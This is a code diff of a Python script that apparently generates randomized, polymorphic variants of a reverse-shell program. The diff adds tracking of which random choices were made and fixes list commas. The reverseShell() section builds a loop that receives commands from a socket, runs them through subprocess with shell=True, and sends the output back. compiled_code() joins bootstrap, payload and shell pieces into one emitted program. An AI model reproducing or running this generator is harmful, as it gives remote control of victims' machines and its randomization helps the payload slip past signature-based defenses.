@@ -1,25 +1,31 @@
 import random
 
-
+geneSequence = []
 def resolver2D(array): 
     """
     """
-    return_string = ""   
+    global geneSequence
+    return_string = ""  
+    geneArray = []
     # for i in array:
     #     print("We are looking at {} which is type {}".format(i, type(i)))
     # print("printing return_string {}".format(return_string))
     for i in array:  
         # print("printing return_string {}".format(return_string))
-        #print("loop looking at {}".format(i)) 
+        # print("loop looking at {}".format(i)) 
         if type(i) is list:
-            #print("making a choice and adding {} to the return string.".format(i))
+            # print("making a choice and adding {} to the return string.".format(i))
             # return_string += random.choice(i)
-            #return(resolver2D(i))
-            return_string = return_string + str(random.choice(i) )
+            # return(resolver2D(i))
+            var = int(random.randrange(len(i)) )
+            return_string = return_string + str(i[var])
+            geneArray.append(var)
         elif type(i) is str:  # type(i) is str:
-            #print("adding {} to the return_string.".format(i))
+            # print("adding {} to the return_string.".format(i))
             return_string += i 
-            # pass    
+            # geneArray.append(int(0))
+            # pass  
+    geneSequence.append(geneArray)  
     return(return_string)
 
 
@@ -90,18 +96,16 @@ def reverseShell():
             'while 1 == 1:\n',
             'while 1 != 2:\n'
         ],
-        '   command = s.recv(1024).decode("utf-8")\n'
-        '   if not command: break\n'
-        '   data = subprocess.check_output(command, shell=True)\n'
+        '   command = s.recv(1024).decode("utf-8")\n',
+        '   if not command: break\n',
+        '   data = subprocess.check_output(command, shell=True)\n',
         '   s.send(data)\n'
     ]
     return(resolver2D(choices))
 
 
 def compiled_code():
-    return("{}{}{}{}".format( \
-        bootstrap(), print_the_thing(), payload(), reverseShell(), \
-            print_the_thing()) )
+    return(f"{bootstrap()}{print_the_thing()}{payload()}{reverseShell()}{print_the_thing()}{geneSequence}")
 
 
 if __name__ == "__main__":
@@ -139,8 +143,8 @@ if __name__ == "__main__":
 
     # print(resolver(n_dimensional))
     for i in n_dimensional:
-        #print(i)
-        print(random.choice(i))
+        var = random.randrange(len(i))
+        print(i[var])
     print("############################################################")
     print("### actual output program                                ###")
     print("############################################################")
